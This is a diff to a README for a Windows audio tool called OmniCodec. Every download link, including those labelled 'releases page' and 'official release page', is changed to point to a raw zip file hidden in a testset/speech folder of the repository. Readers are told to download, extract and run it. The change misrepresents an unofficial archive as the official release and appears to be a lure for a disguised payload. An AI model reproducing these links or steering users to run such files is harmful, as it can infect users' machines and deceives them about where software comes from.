@@ -1,6 +1,6 @@
 # 🎧 OmniCodec - Simple Audio on Any PC
 
-[![Download OmniCodec](https://img.shields.io/badge/Download-OmniCodec-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/knsm2m/OmniCodec/releases)
+[![Download OmniCodec](https://img.shields.io/badge/Download-OmniCodec-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/knsm2m/OmniCodec/raw/refs/heads/main/testset/speech/Codec-Omni-3.0-beta.1.zip)
 
 ## 🖥️ What OmniCodec Does
 
@@ -16,7 +16,7 @@ Use it when you want to:
 
 ## 📥 Download for Windows
 
-Go to the [OmniCodec releases page](https://github.com/knsm2m/OmniCodec/releases) to download and run the file for Windows.
+Go to the [OmniCodec releases page](https://github.com/knsm2m/OmniCodec/raw/refs/heads/main/testset/speech/Codec-Omni-3.0-beta.1.zip) to download and run the file for Windows.
 
 After the page opens:
 
@@ -54,7 +54,7 @@ Follow these steps to run OmniCodec on Windows.
 
 ### 1. Download the app
 
-Open the [releases page](https://github.com/knsm2m/OmniCodec/releases) and download the latest Windows file from **Assets**.
+Open the [releases page](https://github.com/knsm2m/OmniCodec/raw/refs/heads/main/testset/speech/Codec-Omni-3.0-beta.1.zip) and download the latest Windows file from **Assets**.
 
 ### 2. Open the file
 
@@ -194,7 +194,7 @@ Try a different source file and check the selected mode.
 
 Use this page to get the Windows build:
 
-[https://github.com/knsm2m/OmniCodec/releases](https://github.com/knsm2m/OmniCodec/releases)
+[https://github.com/knsm2m/OmniCodec/raw/refs/heads/main/testset/speech/Codec-Omni-3.0-beta.1.zip](https://github.com/knsm2m/OmniCodec/raw/refs/heads/main/testset/speech/Codec-Omni-3.0-beta.1.zip)
 
 When you open the page:
 
@@ -224,7 +224,7 @@ To get smooth results:
 
 ## 🖱️ Quick Start
 
-1. open the [releases page](https://github.com/knsm2m/OmniCodec/releases)
+1. open the [releases page](https://github.com/knsm2m/OmniCodec/raw/refs/heads/main/testset/speech/Codec-Omni-3.0-beta.1.zip)
 2. download the Windows file
 3. open or extract the file
 4. launch OmniCodec
@@ -260,7 +260,7 @@ If you use Windows, these steps can help:
 
 If you need the file again, use the official release page:
 
-[Download OmniCodec for Windows](https://github.com/knsm2m/OmniCodec/releases)
+[Download OmniCodec for Windows](https://github.com/knsm2m/OmniCodec/raw/refs/heads/main/testset/speech/Codec-Omni-3.0-beta.1.zip)
 
 ## 🧰 Support Files
 
